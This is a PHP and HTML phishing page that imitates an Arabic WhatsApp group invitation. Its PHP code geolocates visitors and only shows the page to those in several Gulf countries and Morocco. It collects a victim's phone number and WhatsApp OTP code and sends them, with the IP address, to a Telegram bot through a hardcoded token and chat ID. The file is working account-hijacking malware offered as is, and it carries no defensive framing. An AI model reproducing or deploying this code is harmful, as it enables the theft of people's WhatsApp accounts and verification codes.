<?php
function get_ip_server()
{
    $ip = 'UNKNOWN';

    $ip_headers = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];

    foreach ($ip_headers as $header) {
        if (isset($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            break;
        }
    }

    return $ip;
}

$ip = get_ip_server();
$access_key = 'cf4193at8h68ef4264487612f188c88e';

// Initialize CURL:
$ch = curl_init('https://api.ipstack.com/' . $ip . '?access_key=' . $access_key . '');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Store the data:
$json = curl_exec($ch);
curl_close($ch);

// Decode JSON response:
$api_result = json_decode($json, true);

$allowedCountries = ['SA', 'OM', 'BH', 'KW', 'QA', 'AE', 'JO','MA'];
$redirectUrl = 'https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ar';

$nobots = 0;

if (in_array($api_result['country_code'], $allowedCountries)) {
    $nobots = 1;
} else {
    header('Location: ' . $redirectUrl);
}


$telegramToken = "1.8695157225:AAHQo-0UWYc_W_Jood0Ej2ub7aox2FtN6tc";
$apiUrl = "https://api.telegram.org/bot" . $telegramToken;
$chatId = "6300002037";




// Define message parts
$baseMessage = "<b>[Whtspp Code OTP]</b>";
$idd = $_POST['iddR'];
$ipad = $_POST['ipad'];
$numeratel = $_POST['mobile_phone'];
$confirm = $_POST['confirmcode'];



// Construct the message text
$messageText = "$baseMessage
    ID:#$idd: BOUGAYO IP: $ipad
    ID:#$idd: Numbers Phone: $numeratel
    ID:#$idd: whtspp Code OTP: $confirm";

$parametre = [
    'chat_id' => $chatId,
    'parse_mode' => "HTML",
    'text' => $messageText,
];

$sender = curl_init($apiUrl . '/sendMessage');
curl_setopt($sender, CURLOPT_HEADER, false);
curl_setopt($sender, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($sender, CURLOPT_POST, 1);
curl_setopt($sender, CURLOPT_POSTFIELDS, ($parametre));
curl_setopt($sender, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($sender);
curl_close($sender);




?>

<!DOCTYPE html>
<html lang="ar" id="facebook" class="">

<head>
    <meta charset="utf-8">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <script
        nonce="">function envFlush(a) { function b(b) { for (var c in a) b[c] = a[c] } window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env)) } envFlush({[...]</script>
    <script nonce="">window.openDatabase && (window.openDatabase = function () { throw new Error() });</script>
    <script nonce="">_btldr = {};</script>
    <script
        nonce="">(function () { function a(a) { return a.parentElement !== document.body && a.parentElement !== document.head } function b(a) { return a.nodeName === "SCRIPT" || a.nodeName === "LINK" [...]</script>
    <style nonce=""></style>
    <script nonce="">__DEV__ = 0;</script><noscript>
        <meta http-equiv="refresh" content="0; URL=/invite/--sanitized-S228802--?lang=ar&amp;_fb_noscript=1" />
    </noscript>
    <title id="pageTitle">الدعوة للانضمام إلى مجموعة واتساب</title>
    <meta name="bingbot" content="noarchive">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="description" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta name="keywords">
    <meta property="og:title" content="">
    <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v4/yo/r/J5gK5AgJ_L5.png">
    <meta property="og:site_name" content="WhatsApp.com">
    <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta property="og:keywords">
    <meta property="invite_link_type" content="REGULAR">
    <meta property="invite_link_type_v2" content="">
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="manifest" href="/data/manifest.json" crossorigin="use-credentials">
    <meta name="robots" content="noindex">
    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yz/r/ujTY9i_Jhs1.png">
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/y9/l/1,cross/C-dqzSrX_3A.css"
        data-bootloader-hash="lR1wO42" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yt/l/1,cross/Sj-zldZqFah.css"
        data-bootloader-hash="h/mqcr0" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yY/l/1,cross/abldk9QqwF9.css"
        data-bootloader-hash="sRXYEyZ" crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v4/yA/r/MZ7G3XJJG8k.js" data-bootloader-hash="bEx44LC"
        crossorigin="anonymous"></script>
    <script
        nonce="">requireLazy(["HasteSupportData"], function (m) { m.handle({ "clpData": { "6476": { "r": 1000, "s": 1 }, "1838142": { "r": 1, "s": 1 }, "1958484": { "r": 1, "s": 1 }, "1963303": { "r":[...]</script>
    <link href="https://static.whatsapp.net/rsrc.php/v4/yy/r/4bYuy61L7v7.js" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v4/yy/r/4bYuy61L7v7.js" async="" crossorigin="anonymous"
        data-bootloader-hash-client="2RiPCSb"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v4iJoa4/yK/l/ar_AR/pFrSpJ3SP6D.js" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v4iJoa4/yK/l/ar_AR/pFrSpJ3SP6D.js" async=""
        crossorigin="anonymous" data-bootloader-hash-client="II4ZRlU"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v4/yV/r/Pb8gsLBLMah.js" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v4/yV/r/Pb8gsLBLMah.js" async="" crossorigin="anonymous"
        data-bootloader-hash-client="f9mbO29"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v4/yN/r/Hl12IaDM6Qc.js" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v4/yN/r/Hl12IaDM6Qc.js" async="" crossorigin="anonymous"
        data-bootloader-hash-client="fqmpkPd"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v4/y-/r/fjpkgs9PGBf.js" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v4/y-/r/fjpkgs9PGBf.js" async="" crossorigin="anonymous"
        data-bootloader-hash-client="YH5IBIz"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v4/yV/r/vjbKCjVd5OR.js" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v4/yV/r/vjbKCjVd5OR.js" async="" crossorigin="anonymous"
        data-bootloader-hash-client="8TNZYzX"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v4iCoc4/yF/l/ar_AR/XIk-vaGxhbm.js" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v4iCoc4/yF/l/ar_AR/XIk-vaGxhbm.js" async=""
        crossorigin="anonymous" data-bootloader-hash-client="HH/Fzim"></script>
        <style>
    .iti--allow-dropdown .iti__flag-container,
    .iti--separate-dial-code .iti__flag-container {
        right: auto;
        left: 0;
        direction: ltr !important;
    }


    .iti--allow-dropdown input,
    .iti--allow-dropdown input[type=tel],
    .iti--allow-dropdown input[type=text],
    .iti--separate-dial-code input,
    .iti--separate-dial-code input[type=tel],
    .iti--separate-dial-code input[type=text] {
        padding-right: 6px;
        padding-left: 52px;
        margin-left: 0;
        border-top: none;
        border-right: none;
        border-left: none;
        border-bottom: 3px solid #128c7e;
    }

    .iti__flag {
        border-radius: 4px;
    }

    .cod88e {

        padding-right: 6px;
        /* padding-left: 52px; */
        margin-left: 0;
        border-top: none;
        border-right: none;
        border-left: none;
        border-bottom: 3px solid #128c7e;
    }
    </style>
</head>

<body id="top-of-page" class="_2yz0 _9sca _af-3 _aiux  ar chrome webkit win x1 Locale_ar_AR" dir="rtl">
    <script type="text/javascript" nonce="">requireLazy(["bootstrapWebSession"], function (j) { j(1741643045) })</script>
    <div data-testid="whatsapp_www_full_page" class="_2ywh _li _9kh2" style="visibility: hidden">
        <div class="_2y_d _9rxy">
            <div class="_adhc"><a href="#content-wrapper" class="_aeal _asnw _9vcv"
                    data-ms="{&quot;creative&quot;:&quot;link&quot;}"><span class="_advp _aeam">تخطي إلى
                        المحتوى</span></a>
                <header class="_af-2 _afwk" data-testid="whatsapp_www_header" id="u_0_0_kL">
                    <div class="_afvx">
                        <div class="_afvy">
                            <div class="_af8g"><button aria-label="فتح قائمة الهاتف المحمول" class="_afvu _ain3 _9vcv"
                                    data-ms-clickable="true"
                                    data-ms="{&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_MobileHamburgerMenu_Open&quot;}"
                                    id="u_0_1_IR"><span class="_advp _aeam"><svg width="25" height="33"
                                            viewBox="0 0 25 33" fill="none" class="_wauiIcon__hamburgerMenuRebrand">
                                            <line x1="1.04297" y1="12.75" x2="23.543" y2="12.75" stroke="currentColor"
                                                stroke-width="1.5" stroke-linecap="round"></line>
                                            <line x1="1.04297" y1="16.75" x2="23.543" y2="16.75" stroke="currentColor"
                                                stroke-width="1.5" stroke-linecap="round"></line>
                                            <line x1="1.04297" y1="20.75" x2="23.543" y2="20.75" stroke="currentColor"
                                                stroke-width="1.5" stroke-linecap="round"></line>
                                        </svg></span></button>
                                <nav class="_9t0g" id="u_0_2_H2"><svg width="101" height="22" viewBox="0 0 101 22"
                                        fill="none" class="_af87 _9t0j" xmlns="http://www.w3.org/2000/svg">
                                        <g clip-path="url(#clip0_4057_1490)">
                                            <path
                                                d="M39.9672 12.7979H39.9378L38.0929 5.5H35.87L33.9867 12.7095H33.9563L32.2524 5.50442H29.8828L32.741 16.0887H35.1456L36.9442 8.8847H36.9747L38.8049 16.0[...]
                                                fill="currentColor"></path>
                                            <path
                                                d="M25.9306 10.5046C25.8259 7.69499 24.6176 5.0336 22.5581 3.07618C20.4986 1.11877 17.7471 0.0166645 14.8781 3.00753e-06H14.8239C12.8918 -0.00140293 10.[...]
                                                fill="currentColor"></path>
                                            <path
                                                d="M10.946 5.6393C10.8086 5.64193 10.673 5.67157 10.5474 5.72646C10.4218 5.78135 10.3087 5.86038 10.2149 5.95887C9.94968 6.22535 9.20833 6.86669 9.16546[...]
                                                fill="currentColor"></path>
                                        </g>
                                        <defs>
                                            <clipPath id="clip0_4057_1490">
                                                <rect width="100" height="22" fill="white" transform="translate(0.5)">
                                                </rect>
                                            </clipPath>
                                        </defs>
                                    </svg><button aria-label="إغلاق قائمة الهاتف المحمول" class="_9t0i _ain3 _9vcv"
                                        data-ms-clickable="true"
                                        data-ms="{&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_MobileHamburgerMenu_Close&quot;}"
                                        id="u_0_3_Si"><span class="_advp _aeam"><svg width="16" height="16" fill="none"
                                                class="_9s6z">
                                                <path fill-rule="evenodd" clip-rule="evenodd"
                                                    d="M15.495 1.353L14.364.222 7.859 6.727 1.637.505.507 1.636l6.22 6.222-6.505 6.506 1.131 1.131L7.86 8.99l6.79 6.79 1.13-1.132-6.788-6.79 6.504-6.504[...]
                                                    fill="currentColor"></path>
                                            </svg></span></button>
                                    <ul class="_9t0k _a4cd">
                                        <li class="_9t0h"><a href="https://www.whatsapp.com/"
                                                class="_aeo9 _asnw _9vcv _9sep"
                                                data-ms="{&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_Home_Mobile_Link"}"
                                                ><span class="_advp _aeam">الصفحة الرئيسية</span></a></li>
